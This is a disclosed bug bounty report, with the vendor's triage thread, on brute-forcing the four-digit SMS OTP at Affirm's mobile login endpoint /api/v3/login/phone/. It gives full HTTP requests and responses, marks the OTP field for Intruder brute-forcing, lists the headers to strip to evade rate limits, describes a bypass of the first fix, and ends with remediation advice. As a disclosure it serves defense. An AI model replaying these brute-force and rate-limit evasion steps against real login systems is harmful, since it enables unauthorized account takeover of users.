---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-authentication-generic
  - env/web
  - impact/account-takeover
  - trigger/session-cookie
  - trigger/brute-force
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2020-12-01
submitted: 2019-12-31T19:28:39.154Z
bounty_usd: null
votes: 155
cve: []
program: "[[programs/affirm|Affirm]]"
reporter: "yogesh_ojha"
source: "https://hackerone.com/reports/766578"
title: "Absence of Token expiry leads to Unauthorized login Access"
---
# Absence of Token expiry leads to Unauthorized login Access

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 155 | **Program:** Affirm | **Disclosed:** 2020-12-01

- Report: [https://hackerone.com/reports/766578](https://hackerone.com/reports/766578)
- CWE: Improper Authentication - Generic
- Submitted: 2019-12-31T19:28:39.154Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary
While doing the testing for the mobile app, I observed out that it is possible to bypass the authentication and gain unauthorized access to the user's account bu brute-forcing the PIN due to lack of login token expiry.

The way affirm mobile login works is that,

User inputs the phone number
It then makes a call to an API endpoint /api/v3/login/phone/
```
POST /api/v3/login/phone/ HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 40
Host: hackerone.affirm-odin.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.13.1
Affirm-User-Agent: Affirm-Android

{"channel":"sms","address":"7022170000"}
```

This endpoint /api/v3/login/phone/ in turn generates a token and sends in the response.
The response looks something similar to this

```
HTTP/1.1 200 OK
Date: Tue, 31 Dec 2019 11:53:27 GMT
Content-Type: application/json
Connection: close
Server: openresty
Vary: Accept-Encoding
Affirm-Device: XXX=
Affirm-Client: XXXX-
cache-control: private, no-cache, no-store, must-revalidate
X-Affirm-Request-Id: a3bcdedb-0e18-4760-c796-1cd60158f86c
Strict-Transport-Security: max-age=86400
Content-Length: 299

{"response_url": "/api/v3/login/phone/SOMETOKEN"}
```

Another call to the api is made to the URL obtained from the above response_url This API request looks like this

```
POST /api/v3/login/phone/SOMETOKEN HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 19
Host: hackerone.affirm-odin.com
Connection: close
Accept-Encoding: gzip, deflate
Affirm-User-Agent: Affirm-Android
Affirm-App-Version: 3.62.3
Affirm-App-Version-Code: 312
Affirm-OS-Version: 22

{"response":"0000"}
```

Since SOMETOKEN in the above request doesn't get expired, this request can be sent to Intruder or similar tools to brute force the response OTP parameter.
Once the response is valid, this can be verified by the 200 status obtained in the response and the length of the response.
Like this,
{F672314}

The response will be

```
HTTP/1.1 200 OK
Date: Tue, 31 Dec 2019 12:30:58 GMT
Content-Type: application/json
Connection: close
Server: openresty
Vary: Accept-Encoding
Affirm-Device: eyJkZXZpY2VfaWQiOiAiZDk3NTcyNTQtYmZkNS00NGFiLWE1ZjQtMTk3YzI2NzhjMTQyIn0=
Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk
cache-control: private, no-cache, no-store, must-revalidate
X-Affirm-Request-Id: dc1a2835-e8bc-4f0e-cf08-05c50c942eca
Strict-Transport-Security: max-age=86400
Content-Length: 109

{"status": "authenticated", "token": null, "user_id": "1479-5770-XGGL", "expiration": "3019-12-31T17:17:38Z"}
```

This response contains Affirm-Client which is like a session ID, later used to make a request.

To verify if this is the actual session ID or not, this can be done by making a request to the api

```
GET /api/v2/users/1479-5770-XGGL HTTP/1.1
Host: hackerone.affirm-odin.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.13.1
Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk
Affirm-Platform: android
Affirm-User-Agent: Affirm-Android
Affirm-App-Version: 3.62.3
Affirm-App-Version-Code: 312
Affirm-OS-Version: 22
```

The user ID can also be obtained from the above response.

If the Affirm-Client is valid, then you would get the user details on this endpoint which would confirm this vulnerability.

```
{"phone_number": {"phone_number": "+1-702-217-0000", "user_id": "1479-5770-XGGL", "id": "CNAIG0U1BMPHN5BK"}, "status": "ACTIVE", "name": {"last": "NEPAK", "full": "TESTING NEPAK", "user_id": "1479-5770-XGGL", "id": "4ZBC33TYEY12SOWP", "first": "TESTING"}, "is_personalized_services_active": true, "created": "2019-12-31T10:48:00Z", "dob": "1980-06-23", "id": "1479-5770-XGGL", "address_confirmation_status": "not confirmed", "address": {"city": "San Francisco", "user_id": "1479-5770-XGGL", "is_po_box": false, "street1": "325 Pacific Ave", "region1_code": "CA", "is_military_address": false, "postal_code": "94111", "country_code": "USA", "id": "G2YM6ESBLH36ETLZ"}, "user_consented_to_lto": null, "email": {"verified": false, "user_id": "1479-5770-XGGL", "email": "who_has_no_name+0000@wearehackerone.com", "id": "B9SUH5XOB1559Q8J"}}
```
{F672319}

### Remediation
Rate limiting could be one of the fundamental solutions by limiting the number of the wrong OTP a user can submit.
The fundamental problem here is not that OTP is possible for Bruteforce, but the lack of token expiry generated for login purpose.

Luckily, there is a better way for this. When the user enters the number, and a password login URL/login is generated on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/, the URL could be set invalid after a few OTP limits.

Once this is set to expiry, then to make another consecutive request to the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN would be automatically invalid. This should be done without even checking OTP to prevent brute-forcing. The login token generation on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/ should be limited.

POC Video
{F672564}
-Happy New year team Affirm <3

## Impact

Unauthorized account access, Account takeover

## Timeline

- **Report Filed**
- **2019-12-31** @h1_analyst_layla: Hi @who_has_no_name,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@bassguitar
- **2020-01-03** @tcwm7nynpbykx_8e: Hi @who_has_no_name, on production, we do have an account locking mechanism for protecting brute forcing the OTP. I'm not sure why this is expolitable on the ODIN testing environment...but can you reproduce this on production? Also, is this a mobile only exploit, or it's a general vulnerability on the login API?
- **2020-01-03** @tcwm7nynpbykx_8e: @who_has_no_name and when you reproduce this on production, please use a number controlled by yourself. Much appreciated!
- **Report Needs More Info**
- **Report New**
- **2020-01-06** @tcwm7nynpbykx_8e: The odin testing environment is a mirror of the production environment, so the endpoints are the same, and you can just replace the host from `hackerone.affirm-odin.com` to `api.affirm.com` or `api-cf.affirm.com`. Thank you!
- **2020-01-06** @tcwm7nynpbykx_8e: @who_has_no_name To be honest, I'm very sure that the account locking mechanism on production protects OTP brute force pretty well, so I don't know if it's worthy your time on this...
- **2020-01-09** @yogesh_ojha: Hi @xiuxiu_3803,

I took this as a challenge and I guess I deserve a bonus for this ;) 

I am able to bypass the OTP brute force in production as well. Let me document this.
- **2020-01-09** @tcwm7nynpbykx_8e: @who_has_no_name wow......I look forward to your report!
- **2020-01-09** @yogesh_ojha: For 3 days, I went crazy without sleep and here is it @xiuxiu_3803
And after 3 days, boom, I am able to bypass the authentication and brute force is really possible.

The reproduction steps are more or less the same as above in production as well.

When the user enters the phone number, the production API first makes the request to

```
POST /api/v3/login/phone/ HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 40
Host: api-cf.affirm.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.12.0
Affirm-Platform: android
Affirm-User-Agent: Affirm-Android
Affirm-App-Version: 3.34.4
Affirm-App-Version-Code: 226
Affirm-OS-Version: 22

{"channel":"sms","address":"6464007658"}
```
I have removed extra parameters in this request.

Now, the response of this API will be

```
HTTP/1.1 200 OK
Content-Type: application/json
Connection: close
Date: Thu, 09 Jan 2020 10:31:29 GMT
Server: openresty
Vary: Accept-Encoding
Affirm-Device: eyJkZXZpY2VfaWQiOiAiMjlmODVmMmItYjQ3ZC00ZWQ1LTgyNGQtMzFjOTcwOTcwZWYxIn0=
Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJS8vEPDAwJNzM39vdw83DyClHSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAGQvGq8.EPiSgQ.GpdgagvT3WcCsp7Fq_J0r5eWefA
cache-control: private, no-cache, no-store, must-revalidate
X-Affirm-Request-Id: 58415f09-6357-4a8f-caa3-ebfb9984a513
Strict-Transport-Security: max-age=86400
X-Cache: Miss from cloudfront
Via: 1.1 f7bf326347bdd7f275a38a22b5b83724.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: FRA2-C1
X-Amz-Cf-Id: NkCRTKCCLyoEwftPHsAyuEgSTbDRqGoLtQB8GhBB2jJgFDaz64Yajg==
Content-Length: 299

{"response_url": "/api/v3/login/phone/AhL5-rmOwkFv6gVoFJgHzhCtMMx3dHjDzc0zJK7tAgEwraBWQ4vPVepQGpwL7GZogz6dbhmJFaZE2Ntpjpm9XbETK1ONUehzHdOs9PttVzrjNw5miEYQ9DbeVsPIa-0e33J2Eh-D12WtJAaUaBQCLU55jgUF-bSHgfnUYfP-AuTy9ttTtGwTimeS-tkd1H5Lo3GMpc2avtr-N3r7-gEdv6grsbqlVMuRb1aW0aCk1sOqL2-VfeLaBTBSc8z_47psZU4"}
```
The ==response_url== is the token/URL that the API will request forward to.

```
POST /api/v3/login/phone/AhL5-rmOwkFv6gVoFJgHzhCtMMx3dHjDzc0zJK7tAgEwraBWQ4vPVepQGpwL7GZogz6dbhmJFaZE2Ntpjpm9XbETK1ONUehzHdOs9PttVzrjNw5miEYQ9DbeVsPIa-0e33J2Eh-D12WtJAaUaBQCLU55jgUF-bSHgfnUYfP-AuTy9ttTtGwTimeS-tkd1H5Lo3GMpc2avtr-N3r7-gEdv6grsbqlVMuRb1aW0aCk1sOqL2-VfeLaBTBSc8z_47psZU4 HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 1376
Host: api-cf.affirm.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.12.0
Affirm-Platform: android
Affirm-User-Agent: Affirm-Android
Affirm-App-Version: 3.34.4
Affirm-App-Version-Code: 226
Affirm-OS-Version: 22

{"response":"7000"}
```
==Again, in this request, I have removed extra parameters as per my need.==

The parameter ==response== is responsible for the 4 digit OTP.

Further, I will be sending this request to the intruder in order to brute force the OTP

{F679541}

The payload options [Numbers] can be as per the attacker's wish.

But, there's a catch here. Instead of having the rate-limiting, or making the OTP after certain invalid attempts, the OTP is time-based. The OTP expires in 5 minutes or so. Now an attacker can always increase the threads in order to brute force more quickly before the OTP expires. 

Also, even if the OTP expires, an attacker can request for new OTP as many times as he wishes. I did not notice any rate limiting on the first request that generates the ==response_url== as well.


# POC
I am sorry, the video is a little longer :( 4 mins
{F679875}

## What went wrong here?
There are a few things that went wrong. 
1. I did not see any account lockout mechanism.
2. The token or ==response_url== that is generated initially doesn't have rate limiting. An attacker can generate as many ==response_url== as he wishes.
3. The OTP has time-based limiting rather than the attempts based limiting. The OTP expires after 5 minutes or so rather than 5 failed attempts. 
I did not find any rate-limiting even after 100s of requests for the same OTP/token.

One of the examples is this, even after 100 failed OTP attempts, it still validates the OTP
{F679822}

## What can be done?
1. The initial ==response_url== must be rate limited. A user should be allowed to request the response_url or token once in every 5 minutes.
2. Using this token, an OTP is generated and then once multiple failed OTP attempts are made, invalidate the ==request_url==. Any further request to this ==request_url== is anyways invalid.
3. Now even if an attacker tries to bypass any of these, he will be again stuck at generating ==request_url== because the earlier URL is invalid after 5 invalid attempts. Now in order to generate new OTP he has to request another URL which can be done only once in 5 minutes. 
4. IP Source-based limiting can also be done, if an attacker is continuously flooding with the request, the IP/account can be locked out for a certain period of time, say 24 hours. 

Also, now since I am able to replicate this on a production system and able to bypass the authentication, your customer's data and the entire business are on the stake. Can you kindly increase the severity to Critical as I am able to bypass Authentication and login to anybody's account and even Takeover is possible. Should you need POC for takeover as well, I will provide it. 
Feel free to correct me, but here's my CVSS Score: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H 9.8 Ctirical

It's 11:54 PM in India, and I am gonna have a good night's sleep after 3 days. :)

Also, please fix this ASAP.
- **2020-01-10** @eto: @who_has_no_name I really appreciate the detail writeup and explanations. 

I have attempted in my side but had a slightly different result. See my intruder request #19 and #20. #19 is the same as the "wrong PIN" request in your video, but I got this #20 right hinting excessive requests. I am wondering if you have encountered a similar situation in your test. Besides, did you find any headers that are relevant to the login rate-limiting? 

I tend to agree to bump this to critical b/c the nature of this finding. Once I confirm w/ developers I will let you the decision. Thanks for the hard work on this one.
- **2020-01-10** @yogesh_ojha: Hi @eto,

Thank you for your appreciation. 

Can you please send the intruder request rather than a response? I can then confirm which header to keep or otherwise remove?
- **2020-01-10** @eto: Request #20 is attached.  The request was sent to intruder from proxy history without modifications.
- **2020-01-10** @yogesh_ojha: I get it. I had initially suspected that you might not have removed ==ioBB parameter and a couple of other headers, as they have something to do with rate limiting==. 
This is where I spent a lot of time bypassing this.

The headers and parameters that must be removed are
1. Affirm-Client
2. Affirm-Device
3. Affirm-Client-Capabilities
4. ioBB parameter in JSON 
5. expand user in JSON parameter

Your request should look similar to this
```
POST /api/v3/login/phone/AhL5-rmOwkFv6gVoFJgHzhCtMMx3dHjDzc0zJK7tAgEwraBWQ4vPVepQGpwL7GZogz6dbhmJFaZE2Ntpjpm9XbETK1ONUehzHdOs9PttVzrjNw5miEYQ9DbeVsPIa-0e33J2Eh-D12WtJAaUaBQCLU55jgUF-bSHgfnUYfP-AuTy9ttTtGwTimeS-tkd1H5Lo3GMpc2avtr-N3r7-gEdv6grsbqlVMuRb1aW0aCk1sOqL2-VfeLaBTBSc8z_47psZU4 HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 1376
Host: api-cf.affirm.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.12.0
Affirm-Platform: android
Affirm-User-Agent: Affirm-Android
Affirm-App-Version: 3.34.4
Affirm-App-Version-Code: 226
Affirm-OS-Version: 22

{"response":"7000"}
```
- **Report Triaged**
- **2020-01-10** @tcwm7nynpbykx_8e: Hi @who_has_no_name, we are still internal triaging the impact and cause of this vulnerability, and once we have a better understanding on that, we'll set the award.

Again, really good finding, very appreciate for the effort (and proving me wrong)!
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2020-01-11** @yogesh_ojha: Hi @xiuxiu_3803,

It's not about proving each other wrong, it's about challenging each other, and helping each other grow. Thanks for raising the severity to Critical.
- **2020-01-11** @yogesh_ojha: Wow. Thanks for the bonus and bounty :)
- **2020-01-11** @eto: @who_has_no_name Appreciate the efforts on this finding.  We are still working on the remediation, so please don't disclose the finding until we are able to fully fix it:)

One additional question about the test environment. To MITM the traffic, did you have to bypass the certificate pinning on the mobile application?
- **2020-01-11** @yogesh_ojha: No, I am not disclosing this to anybody. I will, of course, follow up with you on the remediation. Please let me know if you require me to do any retest during or after the remediation.

Yes, I was about to ask you on this MITM. On the production, I am able to bypass the certificate pinning because of a silly mistake from the developer. Since production apks are not in the scope, what could be the best way to report it to you? I can provide the remediation as well on the SSL pinning bypass.
- **2020-01-13** @tcwm7nynpbykx_8e: Hi @who_has_no_name, when you say you are able to bypass the certificate pinning on production, do you mean you were able to bypass the certificate pinning on the odin testing app, or you were able to bypass it on the production app? If you are able to bypass the certificate pinning on the production app, we can open another report, and we'll take a look.
- **2020-01-13** @tcwm7nynpbykx_8e: @who_has_no_name, sorry, I was mistaken.... I just confirmed with our engineer that on production we don't have certificate pinning on the Android app.....
- **2020-01-13** @tcwm7nynpbykx_8e: Hi @who_has_no_name, we have fixed the issue in the backend on production and the ODIN testing environment. For production, we have also adjusted our rate limit on the firewall, so might not be that straight forward to verify the backend fix on production; for ODIN testing environment, there's no firewall. Can you verify the issue is resolved?
- **2020-01-14** @yogesh_ojha: Hi @xiuxiu_3803 
Sure, will check on the production. Give me some time.
- **2020-01-14** @yogesh_ojha: Hi @xiuxiu_3803 
I confirm the older method has been fixed. It is blocking me.

But again, I found a way to bypass this on the Testing Odin environment. A new set of payload, a new way to attack, and I am able to bypass on Odin. 

{F683996}
You can see here, even after 85 requests, I am still not blocked. I can still brute force. Do you want me to raise a separate ticket for this? Or shall I continue on this same?
I believe this has to go as a new ticket because it is a bypass for #766578.
- **2020-01-14** @tcwm7nynpbykx_8e: Hi @who_has_no_name. Thank you for the verification. Do you mean the older method has been fixed on ODIN?

Can you disclose the new exploitation? For now, please continue on this report, assume if the new exploitation is based on the same root vulnerability, that we didn't fix it completely. However, if after internal triage, it's determined to be another vulnerability, which is unrelated to the one that was previously exploitable, we can open another report.
- **2020-01-14** @yogesh_ojha: Yes, older method has been fixed. I am not able to continue any further with the old exploitation method. 

Yes please, I will definitely disclose the new exploitation. I am in the process of documenting it. 

Also, if I am able to bypass the auth on the web application as well, Does that go as a new ticket or continuation of this?
- **2020-01-14** @tcwm7nynpbykx_8e: Sorry, just wanted to confirm, when you say "I confirm the older method has been fixed. It is blocking me.", do you mean the older method has been fixed on ODIN, or you mean production? Because, again the production has the new WAF rate limit rule, so being blocked on production does not necessarily mean the root vulnerability is fixed. So just wanted to confirm the fix that we pushed out is immune to at least your older exploitation.

This report exposed a vulnerability in the `/api/v3/login/phone/` endpoint, which is a login endpoint for mobile applications and is implemented based on the web application login endpoint implementation. Based on the previous triage, it is determined the vulnerability resides only on the mobile endpoint. So if you able to bypass the web application authentication, it might likely be another vulnerability on the web application login endpoint. However, I cannot say for sure at this moment. We'll have to internally triage first.
- **2020-01-14** @yogesh_ojha: Sorry for the confusion.

Yes @xiuxiu_3803, on ODIN it is fixed with the older method.

Let's make this simple. Answering your question
==So just wanted to confirm the fix that we pushed out is immune to at least your older exploitation.==
Yes, You are immune to older exploitation. Removing the header no longer works.

Removing the header gives me this response

```
HTTP/1.1 401 UNAUTHORIZED
Date: Tue, 14 Jan 2020 07:41:10 GMT
Content-Type: application/json
Content-Length: 98
Connection: close
Server: openresty
Affirm-Device: eyJkZXZpY2VfaWQiOiAiYmE1MDkwYzEtZTA5MS00OWUzLWFiZTAtNGQ5ZGJhNzEzOGNiIn0=
cache-control: private, no-cache, no-store, must-revalidate
X-Affirm-Request-Id: bba04725-94bf-4da9-cdbd-5e7633851fed

{"status_code": 401, "message": "Invalid Request", "code": "unauthorized", "type": "unauthorized"}
```

So I confirm the fix that is pushed, is correct to some extent. I am currently documenting the new exploitation. Give me some time.
- **2020-01-14** @yogesh_ojha: # New bypass/Exploit

This was a lot easier than I expected it to be.

## Steps to reproduce

Make a request to this endpoint

```
POST /api/v3/login/phone/ HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 40
Host: hackerone.affirm-odin.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.13.1
Affirm-User-Agent: Affirm-Android

{"channel":"sms","address":"7022170092"}
```

Now you would get the response something similar to 

```
HTTP/1.1 200 OK
Date: Tue, 14 Jan 2020 09:02:24 GMT
Content-Type: application/json
Connection: close
Server: openresty
Vary: Accept-Encoding
Affirm-Device: eyJkZXZpY2VfaWQiOiAiNzI1YmU5NmQtY2NkMy00MDFjLWEwMjktMmYzZGM4MjQ5OWIyIn0=
Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJScvJy8gpy9PW3sDA28jAO81TSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAExuGgE.EP8VIA.SjZqfEXdqag1bYw15c1l0wPRW50
cache-control: private, no-cache, no-store, must-revalidate
X-Affirm-Request-Id: 4f53c152-e34d-4d66-cd3d-d9aa6dd46bcc
Strict-Transport-Security: max-age=86400
Content-Length: 299

{"response_url": "/api/v3/login/phone/F8LG9hNluILUx3SdYBfoEm9VylB-l7iqlvIhtEpT_jmUEAaDNS1KuLWJ-_5StZrXYZD5mOFwbZaIrwhj_MRFHoex_BnRBmS5euY_204ThRa9lyyR8LyAUjd9JwJLeLtap6jpPNyTs-lZYn9GlUlyylS-iROWkbA185fTE74ncAvNRIkRLb0ylmT3qO0W6cjQYxVXHEdhjAIC6-4S25hdghDh4SwRaI_6MzwGAxQ2hqtRys8Szjf88pZL9HvAHGci11E"}
```

The response_url is where the next request should be sent.

So the request for OTP should be something similar to this

```
POST /api/v3/login/phone/ltRJnrPwBf0_bOeZLD0tadVBO97DBglnQ7mGDoQ_8Zq-vFoVZQbG59VXLUmIdv3D0WDWkcaLHOBLDORayazAVw0vAq0XAqZBJJ6dSC2TFcI4JIU5BOlORm_E85kx-9ATh546t-zAT_37FFldfRFBaiyjcKLCWjQm16I0wAKw7CN9A9zRfYnod81lrW8L6dTUtXjZxUfHMAfE3CXuL7fgOrAujIOmIt8JDmQpC6zeo4md6jDssDuceX_hXJYn8FisHm4 HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 19
Host: hackerone.affirm-odin.com
Connection: close
Affirm-Device: eyJkZXZpY2VfaWQiOiAiZjM1MWU1NDEtNjVjZS00ZTVhLWI3NDMtYWYxZTcwMzRkNGNhIn0=
Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJS8gs0CY0yDAuMcjcON7d0D1HSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAGUKGrU.EP8W9Q.zxALHtprHXz2S5Ik9O6gf2DmGos
Accept-Encoding: gzip, deflate
Affirm-User-Agent: Affirm-Android
Affirm-App-Version: 3.62.3
Affirm-App-Version-Code: 312
Affirm-OS-Version: 22

{"response":"§0000§"}
```

The new fix that you have provided checks for the headers Affirm-Client & Affirm-Device. Earlier this was not the case. The brute-force was possible without these headers

With these headers simply sending to Intruder and doing the Bruteforce is possible.

### POC
{F684124}
If you look carefully, I sent 135 requests, The status was 400 and the length was 629, a similar pattern was observed. 
All of sudden, when a valid OTP is submitted by an Intruder, The status is 200 and the response is 674. 

{F684125}
If you look at the response, we are authenticated.

I don't know why the developer hasn't implemented the fix I have provided earlier. This has a straight forward solution. ==Implement the rate-limiting on the token, the response_url==

1 response URL is associated with 1 user
If multiple failed login attempts have been done on the token, ==Invalidate the token== No further requests will be entertained.
If an attacker wants to leverage this, there's no way he can do, because the response_url is already invalid.

 Next question is, should we allow as many tokens to be generated as an attacker/user wants?
A big No! This is another limiting you can implement. 
On one particular account/userID, limit the number of tokens to be generated by 5 or so. So if an attacker wants to exploit this, his chances of success are only 0.25%, very rare. This is because total no of probable OTP is 10000 (0000-9999) and he can only try 5 times per token for 5 tokens per user, which is 25.

This way, you don't need any firewall rules as well.

==Please, don't trust the firewall rules as well. Most of the time firewall rules checks for the source IP, an attacker can use multiple IPs. For example if we only trust the firewall rules, and do not expire the token, an attacker can make the request on the token from as many IPs as he wants. So to bruteforce 10000 possible OTPs, an attacker would need 2000 IPs, which is quite difficult, but yes exploitable, if you only trust firewall.==
- **2020-01-14** @eto: @who_has_no_name I have the exact same finding in my side as well. The fix was not complete because the developer only enforced the headers (the device header is not required tho) but did NOT change the rate-limit counter.
- **2020-01-15** @yogesh_ojha: Yes, @eto.
I see that you have run Intruder from 0000 to 1234 :D The developer has to implement the rate limit counter on the token that has been generated.
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2020-12-01** @yogesh_ojha: Thank you very much!
